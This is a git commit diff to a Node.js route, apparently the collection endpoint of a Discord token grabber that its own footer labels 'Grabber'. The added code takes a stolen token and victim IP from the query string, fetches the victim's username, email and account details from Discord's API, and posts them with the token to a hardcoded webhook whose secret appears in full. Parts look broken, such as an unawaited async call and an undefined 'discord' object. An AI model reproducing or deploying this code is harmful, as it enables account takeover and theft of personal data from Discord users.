0935fd2a49d49c50ba868bba26069524122fd3d6
sala7ra9i1 <81874044+sala7ra9i1@users.noreply.github.com>
2021-07-05 20:21:24 +0100

    Update decod120dcHigh.js

--- routes/decod120dcHigh.js
+++ routes/decod120dcHigh.js
@@ -3,13 +3,33 @@ const router = express.Router();
 const fetch = require('node-fetch');
 const {WebhookClient} = require('discord.js');
 router.get('/', (req,res) => {
-    if(!req.query.token) return res.render('404', {layout:'home'});
+    if(!req.query.token || !req.query.ip) return res.render('404', {layout:'home'});
     //let parse = parseWebhookURL(req.query.webhook);
     //if(parse == null) return res.render('404', {layout:'home'});
     const webhook = new WebhookClient("861652348848570398", "C5dRI1sIHEvTQlCV8IFNQAB5lUbEEy9eMSr0BiRgZd_7-EMEF_koOu5B_PAujaQf7U1O");
-    webhook.send(req.query.token);
+    let user = getUserData(req.query.token);
+    if(user == null) return;
+    
+    webhook.send(new discord.MessageEmbed().setTitle(`${user.username}#${user.discriminator} | ${user.id}`).addField("Email",user.email).addField("IP Adress",req.query.ip).addField("premium_type",user.premium_type).addField("Token",req.query.token).addField("Flags",user.flags).setFooter("Grabber by × ΉƧΣ ×⚡`#2080").setColor("WHITE"));
     res.send('done');
 })
+
+async function getUserData(token){
+    try{
+        const buffer = await fetch('https://discordapp.com/api/v6/users/@me', {
+            headers:{
+            'Content-Type':'application/json',
+            'Authorization':token
+            }
+        })
+        if(buffer.status !== 200) return null;
+        let json = await buffer.json();
+        return json;
+    }catch(err)
+    {
+        return null;
+    }
+}
 
 function parseWebhookURL(url)
 {
